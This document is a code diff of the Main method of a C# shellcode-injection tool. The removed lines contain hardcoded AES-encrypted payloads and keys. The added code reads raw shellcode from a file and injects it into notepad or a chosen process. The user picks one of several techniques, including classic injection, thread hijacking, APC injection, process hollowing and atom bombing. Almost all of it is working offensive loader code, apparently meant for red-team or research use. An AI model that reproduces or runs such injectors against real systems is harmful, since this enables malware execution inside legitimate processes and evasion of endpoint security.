@@ -1,7 +1,7 @@
 ﻿using System;
+using System.IO;
 using System.Diagnostics;
 
-using static ShellcodeInjectionTechniques.AesHelper;
 using static ShellcodeInjectionTechniques.Debugger;
 
 namespace ShellcodeInjectionTechniques
@@ -10,37 +10,143 @@ namespace ShellcodeInjectionTechniques
     {
         static void Main(string[] args)
         {
-            // change these to your own encrypted payload and key
-            // https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs
-            string payload = "xYvW7Bs7TdHaC9Utat+g35A7T96hSpuK7Vq5Q4rYrJMIh6bZKw+Js++fjoEngxqjzapx6OhJIMp+n/0jCSRdxIbijoRyMCUXJ+mepZ5A/5cY/h5Nz2xQeccXZtbilPkKw0a28bJXYrnI9dusBThx+0Q5oUVotDsgTk/9k3sDkM8aFxOMxLTTHhVg/NQHYE6XOtT3PeAx9R84u2zXi39pBNgn2dwxsp/sdxKdBlbu3yDfH5x0q7pFbyOnNW1a77LrOU9l30+/Gkn8aNP6Bmistqlm1JyVYRqZ3AAm6K0PV5KjnNEdHRqMc9zE3b33vhXcL6BPkDjt0FsilZiprld4Zc/IXPfYeEfcosoVPUaQVRsJ06tX/IB2El0lEGYGVGLVMmjUXjjgO2YMlt9gioZu2UEEKn6VkZ/EnBFMP49VhZ9HELbGECwmhuR/mpbcJmICI81zqulhVYeTaY3TI5jss9/0qRvXHJ0DBRvRTy25Gcs4LGUVE7PTxmPAiuI7dUVpa3GBfRfaIdQhmvIby73hOddN/5YZ7i8zJNJFd6yRgRtNN84OdNAEkIMdM/+pUlYVHogq3gf1j/shrNxYdaftWNqPAAnmH8Qu659LCD1CTh2F9FjdzqQrdbcGfrdxFNKkKQfbtHGDe/W1+BLRBkBzPYFBr2tbC//3+nj6mdX9B2vauJ5CK+wGacaNaPhzMNhMYyrYKMtZjkAoKg4ji7yWz50PK3LiOEH9r1XWLq8fks3zTkkU/dl6aYO1FKoe0P6GPNOCj34FQIZJPeeUkg1b1NXwS4pVhmrDONEfvOVgY0Oe+QljIKRxuxT3P9Gl6IvrEMXD9xqXWmKjBrwUUeWDDdKMsLqTtY/dcaCSaLOO1BcczCXEOGZf7YMGPk10IJj/UmVL4S/ENiVdMtoXf2mPEuupbR0hDCO4LNnoT9QjMjiYNocaSOKKDjNemrfYFf8AfJUpxUxXmUqoLGRB33qGd8R8sUOB3UAhAyWdJJqGKO0+iBOECWDuXPNzOmeSWj5EFpCON5tm61mexAP/Le5ctK8GDAQK0bd53rOyhL+3Jfyh4v33iWXuFZQXUx5Mkb7YXMSYW0n0m/YGucupMhrvag==";
-            string key = "yyjGr3HIrLBejCLxQ6pV7UTBI0fPqOGD";
-
-            //payload = "y2QGm0AxSCeX9sfp2CLqBMNE4HMFaxHK9yecr+t5Zix7gRlny8ze4dm2mG0g4DxqNeFOPVjkRWXAWmYHyaszlGC+Y8n0o9l5uUlehtzZ99s1jKLrvkpmWw2JrW9IA0BuohN1MuvEvgS3um+Ou2LJVXapva4t/etAuzoPu9FhOdF7U8hU8D2f+OPCIQiR6FwnZuqb8tY69XzR/m2PHw3s0gsFALYrVHy+RBfdzb9PcMBg4qSOXh3+rNpVkKz24qgkyaQf9tsX1nYpJpoAjxm0vAQ4mgHjaP6V8ZJkPGFaxYX/H9ThE9rqa96byY5Yhx4RWrB4mJeNJ7ndZRz+miQ1DSUGHorPIZAzIdP5jlDI6xvXNO+KUIQOIVsigu0r/7Iqn1Q5Y6HHD4hk92tdBvTUzpkv6Vn5LZ/mEqgqVf/ZaneYgsmxIlKmMebdOwRyWgeElNhQaibmv+zNTEWvhBGHAuaOaIUuKoWGk0X523inrKmzVYLi67uQoW6j+hZk/qeG0qDzpmoDdg+1gAfCgBI1O+CqpulmG8qnxZ0OA1sKl/g8NlRH3MfanOsLt/qYxJZlfDaojeOX9JGv7dStA8Ju0Q3M3fe1PzCYiDM1JIunk97bQM6xZx7dEaQ+01l4V3pHdxccivtGIOGhLNLILf69mAWOjwVyMK4wUWW4Hi6WIESBolxghXx/+bihaNBlr6s/UzrQRd5soYcHfv8TkFIufoURzioE86WdH9fesRlauii7VQxrss7HYlfIVnTryCZRY/pAoX+qMTm7HgQnzpSQkj0WJlKthLNpgS5j33/VpqyzEn3RGL5je788b4ib9cBVkihxff81jGbiw1fmWJE0VsQBwOf+wR1fwDncFAT0fbOt+xQY2y4FoDgMf+0H4YZsICHHQqI8WrHPwXRP/cx5EamFp6x8jdvZgIj3F6pORYmt1fXqnpsVernvsoVkJz6RL5jF2T1LH4Rrl/4eaE9c5Mu+i2l4cDNiJvNYgkwhsh6qA9N0dk8aYgSdxuEyGKHPGgXGJ8Vi4WDl+cf1CROFFA==";
-            //key = "4kSuqjJtEJXsBBJoOdaKN7wWpJQk1VHP";
-
-            byte[] shellcode = Decrypt(key, payload);
-
-            // get the process to target
-            Process target = null;
-            
-            Process[] processes = Process.GetProcessesByName("notepad");
-
-            if(processes.Length == 0)
+            // Test if input arguments were supplied.
+            if (args.Length < 2)
             {
-                Debug("[!] Unable to find process to inject into!");
+                Console.WriteLine("Please enter technique number, shellcode file and process id.");
+                Console.WriteLine("Usage: Injector <technique no.> <SHELLCODE> [PID - default: notepad pid]");
+                Console.WriteLine("  1. Shellcode Runner");
+                Console.WriteLine("  2. Classic Injection");
+                Console.WriteLine("  3. Thread Hijacking");
+                Console.WriteLine("  4. Local Thread Hijacking");
+                Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
+                Console.WriteLine("  6. Process Hollowing");
+                Console.WriteLine("  7. Inter - Process Mapped View");
+                Console.WriteLine("  8. Atom Bombing");
+                Console.WriteLine("  9. Process Doppelgänging(TODO)");
                 return;
             }
 
-            Debug("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
-            target = processes[0];
-            
-                
-            // instantiate the chosen technique
-            ITechnique teckers = new AtomBomb();
-            Debug("[+] Using technique: {0}", new string[] { teckers.GetType().ToString() });
+            if (!int.TryParse(args[0], out int choice) || choice < 1 || choice > 10)
+            {
+                Console.WriteLine("Invalid technique choice.");
+                Console.WriteLine("Available Techniques:");
+                Console.WriteLine("  1. Shellcode Runner");
+                Console.WriteLine("  2. Classic Injection");
+                Console.WriteLine("  3. Thread Hijacking");
+                Console.WriteLine("  4. Local Thread Hijacking");
+                Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
+                Console.WriteLine("  6. Process Hollowing");
+                Console.WriteLine("  7. Inter - Process Mapped View");
+                Console.WriteLine("  8. Atom Bombing");
+                Console.WriteLine("  9. Process Doppelgänging(TODO)");
+                return;
+            }
+
+            var filePath = args[1];
+
+            if (!File.Exists(filePath))
+            {
+                Console.WriteLine($"File not found: {filePath}");
+                return;
+            }
+
+            byte[] shellcode = System.IO.File.ReadAllBytes(filePath);
+
+            Process target = null;
+            Process[] processes;
+
+            if (args.Length < 3)
+            {
+                // get the process to target
+                processes = Process.GetProcessesByName("notepad");
+
+                if (processes.Length == 0)
+                {
+                    Console.WriteLine("[!] Unable to find 'notepad.exe' PID to inject into!");
+                    return;
+                }
+
+                Console.WriteLine("[+] Found 'notepad.exe' process: {0}", new string[] { processes[0].Id.ToString() });
+                target = processes[0];
+
+            } else
+            {
+                if (!int.TryParse(args[2], out int pid) || pid < 0)
+                {
+                    Console.WriteLine("Invalid process ID.");
+                    return;
+                }
+
+                try
+                {
+                    target = Process.GetProcessById(pid);
+                    Console.WriteLine($"Found process ID {pid} running.");
+                }
+                catch (ArgumentException)
+                {
+                    Console.WriteLine($"Unable to find process with ID {pid} to inject into!");
+                    return;
+                }
+            }
+
+            ITechnique teckers = new ShellcodeRunner();
+
+            switch (choice)
+            {
+                case 1:
+                    Console.WriteLine("[*] Injection Technique: 1. Shellcode Runner");
+                    teckers = new ShellcodeRunner();
+                    break;
+                case 2:
+                    Console.WriteLine("[*] Injection Technique: 2. Classic Injection");
+                    teckers = new ClassicInjection();
+                    break;
+                case 3:
+                    Console.WriteLine("[*] Injection Technique: 3. Thread Hijacking");
+                    teckers = new ThreadHijack();
+                    break;
+                case 4:
+                    Console.WriteLine("[*] Injection Technique: 4. Local Thread Hijacking");
+                    teckers = new LocalThreadHijack();
+                    break;
+                case 5:
+                    Console.WriteLine("[*] Injection Technique: 5. Asychronous Procedure Call Injection (APC Injection)");
+                    teckers = new APCInjection();
+                    break;
+                case 6:
+                    Console.WriteLine("[*] Injection Technique: 6. Process Hollowing");
+                    teckers = new ProcessHollow();
+                    break;
+                case 7:
+                    Console.WriteLine("[*] Injection Technique: 7. Inter-Process Mapped View");
+                    teckers = new InterProcessMappedView();
+                    break;
+                case 8:
+                    Console.WriteLine("[*] Injection Technique: 8. Atom Bombing");
+                    teckers = new AtomBomb();
+                    break;
+                case 9:
+                    Console.WriteLine("[*] Injection Technique: 9. Process Doppelgänging(TODO)");
+                    break;
+                default:
+                    Console.WriteLine("Invalid technique choice.");
+                    Console.WriteLine("Available Techniques:");
+                    Console.WriteLine("  1. Shellcode Runner");
+                    Console.WriteLine("  2. Classic Injection");
+                    Console.WriteLine("  3. Thread Hijacking");
+                    Console.WriteLine("  4. Local Thread Hijacking");
+                    Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
+                    Console.WriteLine("  6. Process Hollowing");
+                    Console.WriteLine("  7. Inter - Process Mapped View");
+                    Console.WriteLine("  8. Atom Bombing");
+                    Console.WriteLine("  9. Process Doppelgänging(TODO)");
+                    break;
+            }
 
             // send the shellcode to the chosen technique to run
             teckers.Run(target, shellcode);
+
 
             // for debugging
 #if DEBUG
